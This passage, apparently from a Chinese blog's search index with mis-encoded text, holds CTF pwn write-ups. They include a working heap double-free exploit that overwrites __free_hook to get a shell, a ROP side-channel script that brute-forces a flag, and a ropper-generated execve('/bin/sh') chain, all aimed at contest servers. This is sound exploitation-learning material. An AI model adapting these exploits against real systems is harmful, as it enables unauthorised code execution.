\u0026#34;./libc-2.26.so\u0026#34; port: str = \u0026#34;10072\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;43.248.98.206\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) m_elf = ELF(fn) libc = ELF(libc_name) def add(index: int, size: int, content, flag: bool = False): if flag: p.clean() p.sendline(b\u0026#34;1\u0026#34;) p.clean() p.sendline(str(index)) p.clean() p.sendline(str(size)) p.clean() p.sendline(content) def delete(index: int, flag: bool = False): if flag: p.clean() p.sendline(b\u0026#34;3\u0026#34;) p.clean() p.sendline(str(index)) add(0, 1071, b\u0026#34;\u0026#34;) # å¤§äº1072ä¼šé€€å‡ºï¼Œä½†æ˜¯1033å°±å¯ä»¥è¿›å…¥unsorted bin add(1, 0x10, b\u0026#34;\u0026#34;) delete(0) add(2, 0x10, b\u0026#34;\u0026#34;) p.recvuntil(b\u0026#34;Your book: \\n\u0026#34;) main_arena = 0x3dac20 main_off = 1002 libc_base = u64(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) - (main_arena + 1002) system_addr = libc_base + libc.sym[\u0026#39;system\u0026#39;] p.sendlineafter(\u0026#34;Let\u0026#39;s make a test.\\n\u0026#34;, hex(system_addr)) delete(1) delete(2) delete(1) p.sendlineafter(\u0026#34;what sizes you make?\\n\u0026#34;, str(0x10)) add(3, 0x10, p64(system_addr + 0x394AE8)) add(4, 0x10, b\u0026#34;/bin/sh\\x00\u0026#34;) add(5, 0x10, b\u0026#34;a\u0026#34;) add(6, 0x10, p64(system_addr)) delete(4) add(7, 0x10, b\u0026#34;\u0026#34;, True) add(8, 0x10, b\u0026#34;\u0026#34;, True) delete(7, True) delete(8, True) delete(7, True) add(9, 0x10, p64(libc.sym[\u0026#39;__free_hook\u0026#39;]+libc_base), True) add(10, 0x10, b\u0026#34;/bin/sh\\x00\u0026#34;, True) add(11, 0x10, b\u0026#34;a\u0026#34;, True) add(12, 0x10, p64(system_addr), True) delete(10, True) p.interactive() XS Club æ£€æŸ¥ç¨‹åºæ¶æ„ æŸ¥çœ‹idaåç¼–è¯‘ä»£ç  ä¸»è¦å‡½æ•°ï¼š è¯»å–å­—ç¬¦ä¸²å¹¶åœ¨æœ«å°¾ç½®é›¶ ä¸€ä¸ªåŠ å¯†å‡½æ•°ï¼Œä»æœ€åçš„ç»“æœï¼ˆ\u0026quot;ZjFhZ3tYU0NURi0yMDIyLWdvLWdvLWdvfQ==\u0026quot;ï¼‰æ¥çœ‹åƒæ˜¯base64ç¼–ç  base64è§£ç  key = base64.b64decode(\u0026#34;ZjFhZ3tYU0NURi0yMDIyLWdvLWdvLWdvfQ==\u0026#34;) å¤§è‡´æ€è·¯ ç¨‹åºç”¨æ²™ç®±å±è”½äº†execveçš„syscallï¼Œé‚£ä¹ˆå¤§è‡´æ€è·¯å°±æ˜¯åˆ©ç”¨openã€readçš„syscallè¯»å…¥flag\nè€Œç¨‹åºåˆæŠŠæ ‡å‡†è¾“å…¥æµå’Œæ ‡å‡†è¾“å‡ºæµå…³é—­äº†ï¼Œè¯´æ˜ä¸€æ¬¡è¿è¡Œåªèƒ½è¾“å…¥ä¸€æ¬¡ï¼Œè€Œä¸”ä¸ä¼šæœ‰å›æ˜¾\nä½†æ˜¯ç¨‹åºåˆæœ‰ä¸€ä¸ªstrcmpï¼Œè¿™è¯´æ˜æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æµ‹ä¿¡é“çš„æ€è·¯æ¥è§£é¢˜\nåœ¨æˆ‘ä»¬è°ƒç”¨å®Œstrcmpåè·³è½¬åˆ°è¿™é‡Œï¼Œå¦‚æœå’Œflagç›¸ç¬¦å°±retåˆ°pauseï¼Œå¦åˆ™å°±ä¼šjmp raxä»è€ŒæŠ¥é”™é€€å‡º\næ„å»ºROP chain æˆ‘ä»¬å…ˆç”¨ropperçœ‹ä¸€ä¸‹ç¨‹åºçš„gadgetï¼š\nå‘ç°å¹¶æ²¡æœ‰æˆ‘ä»¬æƒ³è¦çš„å¯ä»¥æ”¹å˜raxå’Œrdxçš„gadget\nå¦‚æœæƒ³è¦æ”¹å˜raxï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å‡½æ•°çš„è¿”å›å€¼ä¿å­˜åœ¨raxè¿™ä¸ªç‰¹æ€§ï¼š\nset_rax_2 = flat([ # open pop_rdi, pie_base + 0x00000000000011E7, pop_rsi_r15, pie_base + 0x00000000000015A0, 0, strcmp_plt ]) set_rax_0x22 = flat([ # pause pop_rdi, pie_base + 0x00000000000011EF, pop_rsi_r15, pie_base + 0x00000000000015A0, 0, strcmp_plt ]) ä½†æ˜¯åƒreadè¿™æ ·çš„å‡½æ•°ï¼Œå¾€å¾€æ˜¯å¿…é¡»è®¾ç½®rdxçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ªæ”¹å˜rdxçš„gadget\nç»è¿‡è§‚å¯Ÿï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨csuä¸­çš„gadgetï¼š\næˆ‘ä»¬å¯ä»¥å…ˆç”¨csu1ä¸­çš„gadgetè®¾ç½®å¯„å­˜å™¨ï¼Œç„¶åå†è·³åˆ°csu2è®¾ç½®rdxï¼Œç„¶åå› ä¸ºcsu2ä¸­æœ‰ä¸€ä¸ªcall qword ptr [r12+rbx*8]ï¼Œæˆ‘ä»¬å¯ä»¥å°†r12çš„å€¼è®¾ä¸ºreadçš„gotå€¼ï¼Œrbxä¸º0ï¼Œè¿™æ ·å°±èƒ½æ‰§è¡Œreadå‡½æ•°\nå½“æˆ‘ä»¬æ‰§è¡Œå®Œreadå‡½æ•°æ—¶ï¼Œå› ä¸ºç‰©ç†ç›¸é‚»çš„ç¼˜æ•…ï¼Œæˆ‘ä»¬ä¼šæ¯”è¾ƒrbpå’Œrbxçš„å€¼ï¼Œ\næ‰€ä»¥æˆ‘ä»¬è¦è®¾ç½®rbpä¸ç­‰äºrbx\nç„¶åæˆ‘ä»¬å°±è¿›å…¥äº†csu1ï¼Œè¿™é‡Œæœ‰ä¸€ä¸²çš„popï¼ŒåŠ ä¸Šå¤´éƒ¨çš„addï¼Œä¸€å…±æˆ‘ä»¬è¦è®¾ç½®56ä¸ªå­—èŠ‚æ¥è·³è¿‡è¿™äº›æŒ‡ä»¤åˆ°ret\nç„¶åæˆ‘ä»¬è®¾ç½®ä¸€ä¸‹rdiå’Œrsiå°±è½¬åˆ°call strcmp\næœ€åæˆ‘ä»¬å†å¡«å…¥ä¸€ä¸ªpauseçš„syscallå°±å¯ä»¥äº†ï¼Œå¦‚æœç¨‹åºæ²¡æœ‰é€€å‡ºå°±ä¼šè°ƒç”¨pauseè€Œåœæ‰\nä½†é—®é¢˜æ¥äº†ï¼Œæˆ‘ä»¬è¦æ€ä¹ˆå°†æˆ‘ä»¬æƒ³è¦ä¸flagæ¯”è¾ƒçš„å­—ç¬¦è¾“å…¥è¿›æ¥å‘¢ï¼Ÿ\næˆ‘ä»¬å¯ä»¥åœ¨è¯»å…¥invitation codeçš„æ—¶å€™å°†éœ€è¦æ¯”è¾ƒçš„å­—ç¬¦è¾“å…¥è¿›æ¥ï¼š\næ‰€ä»¥rop chainä¸ºï¼š\n# è®¡ç®—ä»£ç åŸºå€ pie_base = u64(io.recv(6).ljust(8, b\u0026#39;\\x00\u0026#39;)) - (0x561d75601161 - 0x561d75600000) # strcmpã€read strcmp_plt = pie_base + elf.plt[\u0026#39;strcmp\u0026#39;] read_plt = pie_base + elf.plt[\u0026#39;read\u0026#39;] read_got = pie_base + elf.got[\u0026#39;read\u0026#39;] # è®¾ç½®rdiã€rsi pop_rdi = pie_base + 0x00000000000011a3 pop_rsi_r15 = pie_base + 0x00000000000011a1 # syscall;ret syscall = pie_base + 0x00000000000009f5 # æœ‰ä¸€ä¸ªgadgetå¯ä»¥è®¾ç½®rdxä¸º0xa # set_rdx_10 = pie_base + 0x00000000000009f7 # ä¸€å¤§å †popï¼Œè®¾ç½®å¯„å­˜å™¨ csu1 = pie_base + 0x000000000000119A # å°†csuä¸­è®¾ç½®çš„å¯„å­˜å™¨çš„å€¼è½¬ç§»åˆ°å…¶ä»–å¯„å­˜å™¨ csu2 = pie_base + 0x0000000000001180 # bssèŠ‚å¼€å§‹ä½ç½® bss_start = pie_base + 0x0000000000202020 # \u0026#34;./flag\\x00\u0026#34;å­—ç¬¦ä¸²ä¿å­˜çš„ä½ç½® flag_str_addr = pie_base + 0x000000000020207a # å°è¯•çš„å­—ç¬¦ä¿å­˜çš„ä½ç½® try_chr_addr = pie_base + 0x000000000020207f # è¯»å…¥çš„flagæ–‡ä»¶å†…å®¹ä¿å­˜çš„ä½ç½® target_chr_addr = bss_start + 0x300 # æµ‹è¯•strcmpæˆä¸æˆåŠŸçš„gadget test_gadget = pie_base + 0x00000000000099b # è®¾ç½®raxä¸º2 set_rax_2 = flat([ # open pop_rdi, pie_base + 0x00000000000011E7, pop_rsi_r15, pie_base + 0x00000000000015A0, 0, strcmp_plt ]) # è®¾ç½®raxä¸º0x22 set_rax_0x22 = flat([ # pause pop_rdi, pie_base + 0x00000000000011EF, pop_rsi_r15, pie_base + 0x00000000000015A0, 0, strcmp_plt ]) # è¯»å…¥è§£ç å†…å®¹ã€\u0026#34;./flag\\x00\u0026#34;å­—ç¬¦ä¸²ã€å½“å‰å°è¯•çš„å­—ç¬¦ io.sendafter(\u0026#39; code\\n\u0026#39;, flat([base64.b64decode( \u0026#39;ZjFhZ3tYU0NURi0yMDIyLWdvLWdvLWdvfQ==\u0026#39;), \u0026#39;\\x00flag\\x00\u0026#39;, try_c])) rop_chain = flat([ # 2å·syscallï¼Œæ‰“å¼€æ–‡ä»¶ set_rax_2, pop_rdi, flag_str_addr, pop_rsi_r15, 0, 0, syscall, # è¯»å–æ–‡ä»¶å†…å®¹ csu1, 0, 1, read_got, 0, # edi target_chr_addr, # rsi flag_len + 1, # rdx csu2, \u0026#39;a\u0026#39; * 56, # æ¯”å¯¹å­—ç¬¦ pop_rdi, try_chr_addr, pop_rsi_r15, target_chr_addr + flag_len, # ç¬¬flag_lenä¸ªå­—ç¬¦ 0, strcmp_plt, test_gadget, # pauseç³»ç»Ÿè°ƒç”¨ set_rax_0x22, syscall ]) è®¾ç½®å»¶æ—¶å™¨ï¼Œä¿è¯ç¨‹åºæ­£å¸¸æ‰§è¡Œ å¯ä»¥ä½¿ç”¨sleepå‡½æ•°ã€recv(0.5)è¿˜æœ‰signalæ¨¡å—æ¥æ‹–æ—¶é—´ï¼Œç­‰å¾…ç¨‹åºè¿›ä¸€æ­¥æ‰§è¡Œ\nsignalæ¨¡å—\ndef handler(signum, frame): raise TimeoutError() signal.signal(signal.SIGALRM, handler) signal.alarm(1) try: io.recvuntil(\u0026#39;Okay, \u0026#39;) signal.alarm(0) signal.signal(signal.SIGALRM, signal.SIG_DFL) except: signal.alarm(0) signal.signal(signal.SIGALRM, signal.SIG_DFL) io.close() return False è¿™ä¸ªæ¨¡å—è®¾ç½®åœ¨ä¸€ç§’ä¹‹åå‘é€TimeoutErrorå¼‚å¸¸ï¼Œä½†å¦‚æœåœ¨è¿™ä¸€ç§’å†…recvåˆ°äº†'Okayï¼Œ'ï¼Œé‚£å°±å–æ¶ˆå‘é€ï¼Œå¦åˆ™å…³é—­è¿œç¨‹/åœæ­¢è¿›ç¨‹\nè¿™æ®µä»£ç ä¿è¯äº†ç¨‹åºåœ¨ä¸€ç§’å†…æ­£ç¡®æ‰§è¡Œï¼ˆä¸æ­£ç¡®æ‰§è¡Œçš„éƒ½æ­»äº†ï¼‰\nrecv(0.5)\ntry: io.recv(timeout=0.5) io.close() return True except: io.close() return False å¦‚æœåœ¨0x5ç§’å†…ç¨‹åºé€€å‡ºäº†ï¼Œå°±è¯´æ˜æ²¡æœ‰æ‰§è¡Œpauseç³»ç»Ÿè°ƒç”¨ï¼Œæ‰€ä»¥å°±å…³é—­è¿œç¨‹/åœæ­¢è¿›ç¨‹\nä¸ºç¬¬9ä¸ªå­—ç¬¦å•ç‹¬å†™rop chain å› ä¸ºæˆ‘ä»¬çš„rop chainä¸­æœ‰ä¸€æ¡flag_len+1ï¼Œè€Œå½“æˆ‘ä»¬çˆ†ç ´ç¬¬ä¹ä¸ªå­—ç¬¦æ—¶è¿™ä¸ªå€¼ä¸º0xaï¼Œåˆšå¥½å’Œ\\nçš„ASCIIç ä¸€æ ·ï¼Œæ‰€ä»¥ä¼šå‘ç”Ÿæˆªæ–­ï¼Œå› æ­¤0xaä¸èƒ½å‡ºç°åœ¨rop chainä¸­\nè€Œæˆ‘ä»¬æ³¨æ„åˆ°syscallçš„gadgetåé¢ä¼šè‡ªåŠ¨å°†rdxè®¾ç½®ä¸º0xaï¼š é‚£ä¹ˆæˆ‘ä»¬ç›´æ¥å¸¸è§„æ€è·¯è°ƒç”¨readå³å¯ï¼Œä¸éœ€è¦ç”¨åˆ°csuï¼š\nif flag_len == 9: rop_chain = flat([ set_rax_2, pop_rdi, flag_str_addr, pop_rsi_r15, 0, 0, syscall, pop_rdi, 0, pop_rsi_r15, target_chr_addr, 0, read_plt, pop_rdi, try_chr_addr, pop_rsi_r15, target_chr_addr + flag_len, 0, strcmp_plt, test_gadget, set_rax_0x22, syscall ]) å®Œæ•´exp from pwn import * import base64 import signal context.arch = \u0026#39;amd64\u0026#39; elf = ELF(\u0026#39;club\u0026#39;) def handler(signum, frame): raise TimeoutError() def pwn(try_c, flag_len): # io = process(\u0026#39;./club\u0026#39;) # io = remote(\u0026#39;127.0.0.1\u0026#39;, 9999) io = remote(\u0026#39;43.248.98.206\u0026#39;, 10075) io.sendafter(\u0026#39; is XS-Club, your name?\\n\u0026#39;, \u0026#39;a\u0026#39;) signal.signal(signal.SIGALRM, handler) signal.alarm(1) try: io.recvuntil(\u0026#39;Okay, \u0026#39;) signal.alarm(0) signal.signal(signal.SIGALRM, signal.SIG_DFL) except: signal.alarm(0) signal.signal(signal.SIGALRM, signal.SIG_DFL) io.close() return False pie_base = u64(io.recv(6).ljust(8, b\u0026#39;\\x00\u0026#39;)) - \\ (0x561d75601161 - 0x561d75600000) strcmp_plt = pie_base + elf.plt[\u0026#39;strcmp\u0026#39;] read_plt = pie_base + elf.plt[\u0026#39;read\u0026#39;] read_got = pie_base + elf.got[\u0026#39;read\u0026#39;] pop_rdi = pie_base + 0x00000000000011a3 pop_rsi_r15 = pie_base + 0x00000000000011a1 syscall = pie_base + 0x00000000000009f5 csu1 = pie_base + 0x000000000000119A csu2 = pie_base + 0x0000000000001180 bss_start = pie_base + 0x0000000000202020 flag_str_addr = pie_base + 0x000000000020207a try_chr_addr = pie_base + 0x000000000020207f target_chr_addr = bss_start + 0x300 test_gadget = pie_base + 0x00000000000099b set_rax_2 = flat([ # open pop_rdi, pie_base + 0x00000000000011E7, pop_rsi_r15, pie_base + 0x00000000000015A0, 0, strcmp_plt ]) set_rax_0x22 = flat([ # pause pop_rdi, pie_base + 0x00000000000011EF, pop_rsi_r15, pie_base + 0x00000000000015A0, 0, strcmp_plt ]) io.sendafter(\u0026#39; code\\n\u0026#39;, flat([base64.b64decode( \u0026#39;ZjFhZ3tYU0NURi0yMDIyLWdvLWdvLWdvfQ==\u0026#39;), \u0026#39;\\x00flag\\x00\u0026#39;, try_c])) rop_chain = flat([ set_rax_2, pop_rdi, flag_str_addr, pop_rsi_r15, 0, 0, syscall, csu1, 0, 1, read_got, 0, # edi target_chr_addr, # rsi flag_len + 1, # rdx csu2, \u0026#39;a\u0026#39; * 56, pop_rdi, try_chr_addr, pop_rsi_r15, target_chr_addr + flag_len, 0, strcmp_plt, test_gadget, set_rax_0x22, syscall ]) if flag_len == 9: rop_chain = flat([ set_rax_2, pop_rdi, flag_str_addr, pop_rsi_r15, 0, 0, syscall, pop_rdi, 0, pop_rsi_r15, target_chr_addr, 0, read_plt, pop_rdi, try_chr_addr, pop_rsi_r15, target_chr_addr + flag_len, 0, strcmp_plt, test_gadget, set_rax_0x22, syscall ]) io.sendlineafter(\u0026#39; leave your phone number here\\n\u0026#39;, flat({0x28: rop_chain})) sleep(0.1) io.recvuntil(\u0026#39;~\\nNow you can join the club, go crazy!!! *\\\\(^o^)/*\\n\u0026#39;) try: io.recv(timeout=0.5) io.close() return True except: io.close() return False table = string.printable + \u0026#34;\\n\u0026#34; flag = \u0026#39;\u0026#39; t = time.time() while True: for c in table: if pwn(c, len(flag)): flag += c break if flag.endswith(\u0026#39;}\u0026#39;): success(flag) success(flat([\u0026#39;time: \u0026#39;, str(round(time.time() - t, 2)), \u0026#39;s\u0026#39;])) break else: info(flag) with open(\u0026#34;out\u0026#34;, \u0026#34;a\u0026#34;, encoding=\u0026#39;UTF-8\u0026#39;) as f: f.write(flag + \u0026#34;\\n\u0026#34;) info(flat([\u0026#39;time: \u0026#39;, str(round(time.time() - t, 2)), \u0026#39;s\u0026#39;])) sleep(0.1) ","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/writeup/%E6%9A%A8%E5%8D%97%E5%A4%A7%E5%AD%A62022%E6%96%B0%E7%94%9F%E8%B5%9B%E5%88%9D%E8%B5%9B-%E9%9D%9E%E5%AE%98%E6%96%B9writeup/","section":"writeup","summary":"åŸé¢˜é“¾æ¥ EasyEasyEasy å› ä¸ºè¯»å…¥çš„æ˜¯ä¸€ä¸ªæœ‰ç¬¦å·æ•°ï¼Œæ‰€ä»¥å½“è¾“å…¥-1 çš„æ—¶å€™ä¹Ÿæ˜¯åˆæ³•çš„ è€Œæˆ‘ä»¬çŸ¥é“ï¼Œ-1%256 ä¹Ÿæ˜¯-1ï¼Œè€Œv5[-1]æ„ä¸º*(v5-1)ï¼ŒæŒ‡å‘ v5 å‰é¢ä¸€ä¸ªæ•°","tags":["pwn"],"title":"æš¨å—å¤§å­¦2022æ–°ç”Ÿèµ›åˆèµ› éå®˜æ–¹WriteUp"},{"categories":["tricks"],"contents":"æŸ¥çœ‹ç¨‹åºæ¶æ„ idaä¼ªä»£ç  exp è¿™é¢˜æ‰‹å·¥æ„é€ ropchainæ¯”è¾ƒå›°éš¾ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ropperæˆ–è€…ROPgadgetçš„ropchainåŠŸèƒ½æ¥ç”Ÿæˆï¼š\nropper ROPgadget exp éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå·¥å…·ç”Ÿæˆçš„ä»£ç å’Œæˆ‘ä»¬æ—¥å¸¸ä½¿ç”¨çš„ä»£ç æ ¼å¼å’Œé£æ ¼ä¸Šéƒ½æœ‰ä¸€å®šå·®è·ï¼Œä»structåŒ…ä¸­å¯¼å…¥çš„packå‡½æ•°ä¹Ÿä¼šå’Œpwntoolsä¸­çš„packèµ·å†²çªï¼Œå¦‚æœä¸€å®šè¦ä½¿ç”¨structçš„packï¼Œå°±åœ¨å¯¼å…¥pwntoolsåå†å¯¼å…¥structï¼Œè¿™æ ·å°±å¯ä»¥è¦†ç›–æ‰pack\n# è‡ªåŠ¨ç”Ÿæˆå¤´éƒ¨ from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes from struct import pack pss: bool = True fn: str = \u0026#34;./rop\u0026#34; libc_name: str = \u0026#34;\u0026#34; port: str = \u0026#34;27311\u0026#34; if_32: bool = True if_debug: bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) # libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None, timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: if until is not None: p.recvuntil(flat(until)) received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) return received def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None, timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout: int = 0.05, no_show: bool = False): received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;æ— æ³•è½¬æ¢{value}æˆ–ä¸å­˜åœ¨ç±»å‹{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True, is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;Ã·\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... # éœ€è¦è‡ªè¡Œè®¾å®šoffset offset: int = 0xC + 4 # Generated by ropper ropchain generator # # 487729c3b55aaec43deb2af4c896b16f9dbd01f7e484054d1bb7f24209e2d3ae IMAGE_BASE_0 = 0x08048000 def rebase_0(x): return pg(x + IMAGE_BASE_0) rop = b\u0026#39;\u0026#39; rop += rebase_0(0x00070016) # 0x080b8016: pop eax; ret; rop += b\u0026#39;/bin\u0026#39; rop += rebase_0(0x00026cda) # 0x0806ecda: pop edx; ret; rop += rebase_0(0x000a2060) rop += rebase_0(0x0000c66b) # 0x0805466b: mov dword ptr [edx], eax; ret; rop += rebase_0(0x00070016) # 0x080b8016: pop eax; ret; rop += b\u0026#39;/sh\\x00\u0026#39; rop += rebase_0(0x00026cda) # 0x0806ecda: pop edx; ret; rop += rebase_0(0x000a2064) rop += rebase_0(0x0000c66b) # 0x0805466b: mov dword ptr [edx], eax; ret; rop += rebase_0(0x00070016) # 0x080b8016: pop eax; ret; rop += pg(0x00000000) rop += rebase_0(0x00026cda) # 0x0806ecda: pop edx; ret; rop += rebase_0(0x000a2068) rop += rebase_0(0x0000c66b) # 0x0805466b: mov dword ptr [edx], eax; ret; rop += rebase_0(0x000001c9) # 0x080481c9: pop ebx; ret; rop += rebase_0(0x000a2060) rop += rebase_0(0x00096769) # 0x080de769: pop ecx; ret; rop += rebase_0(0x000a2068) rop += rebase_0(0x00026cda) # 0x0806ecda: pop edx; ret; rop += rebase_0(0x000a2068) rop += rebase_0(0x00070016) # 0x080b8016: pop eax; ret; rop += pg(0x0000000b) rop += rebase_0(0x00027430) # 0x0806f430: int 0x80; ret; payload = flat({offset: rop}) sendline_after_clean(payload) interactive_after_clean() ","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/tricks/%E4%BD%BF%E7%94%A8ropgadgetropper%E5%B7%A5%E5%85%B7%E6%9E%84%E5%BB%BAropchain/","section":"tricks","summary":"æŸ¥çœ‹ç¨‹åºæ¶æ„ idaä¼ªä»£ç  exp è¿™é¢˜æ‰‹å·¥æ„é€ ropchainæ¯”è¾ƒå›°éš¾ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ropperæˆ–è€…ROPgadgetçš„ropchainåŠŸèƒ½æ¥ç”Ÿæˆï¼š ropper ROPgadget exp","tags":["pwn","ROPgadget","ropper","ropchain"],"title":"ä½¿ç”¨ROPgadgetã€ropperå·¥å…·æ„å»ºropchain"},{"categories":["tricks"],"contents":"å¦‚ä½•æŸ¥çœ‹å½“å‰ç³»ç»Ÿlibcç‰ˆæœ¬ å¦‚ä½•æŸ¥çœ‹å½“å‰ç³»ç»Ÿlibcç‰ˆæœ¬ æŸ¥çœ‹å½“å‰ç³»ç»Ÿçš„libcç‰ˆæœ¬ æŸ¥çœ‹ç¨‹åºå½“å‰é»˜è®¤ä½¿ç”¨çš„libcç‰ˆæœ¬ æŸ¥çœ‹å½“å‰ç³»ç»Ÿçš„libcç‰ˆæœ¬ strings /lib/x86_64-linux-gnu/libc.so.6 | grep \u0026#34;GNU C Library\u0026#34; æŸ¥çœ‹ç¨‹åºå½“å‰é»˜è®¤ä½¿ç”¨çš„libcç‰ˆæœ¬ ldd -v \u0026lt;ç¨‹åºå\u0026gt; ","date":"2022å¹´12æœˆ28æ—¥","permalink":"https://peterliuzhi.top/tricks/%E5%A6%82%E4%BD%95%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E7%B3%BB%E7%BB%9Flibc%E7%89%88%E6%9C%AC/","section":"tricks","summary":"å¦‚ä½•æŸ¥çœ‹å½“å‰ç³»ç»Ÿlibcç‰ˆæœ¬ å¦‚ä½•æŸ¥çœ‹å½“å‰ç³»ç»Ÿlibcç‰ˆæœ¬ æŸ¥çœ‹å½“å‰ç³»ç»Ÿçš„libcç‰ˆæœ¬ æŸ¥çœ‹ç¨‹åºå½“å‰é»˜è®¤ä½¿ç”¨çš„libcç‰ˆæœ¬ æŸ¥çœ‹å½“å‰ç³»ç»Ÿçš„libcç‰ˆæœ¬ strings /lib/x86_64-linux-gnu/libc.so.6 | grep","tags":["pwn","libc"],"title":"å¦‚ä½•æŸ¥çœ‹å½“å‰ç³»ç»Ÿlibcç‰ˆæœ¬"},{"categories":["tricks"],"contents":"å…ˆè¾“å…¥ç©ºæ ¼å°±å¥½äº†ï¼Œatoiä¼šè·³è¿‡ç©ºæ ¼\n","date":"2022å¹´12æœˆ27æ—¥","permalink":"https://peterliuzhi.top/tricks/%E7%BB%95%E8%BF%87atoi%E5%89%8D%E5%AF%B9%E9%A6%96%E5%AD%97%E7%AC%A6%E6%98%AF%E5%90%A6%E4%B8%BA%E8%B4%9F%E5%8F%B7%E7%9A%84%E6%A3%80%E6%9F%A5/","section":"tricks","summary":"å…ˆè¾“å…¥ç©ºæ ¼å°±å¥½äº†ï¼Œatoiä¼šè·³è¿‡ç©ºæ 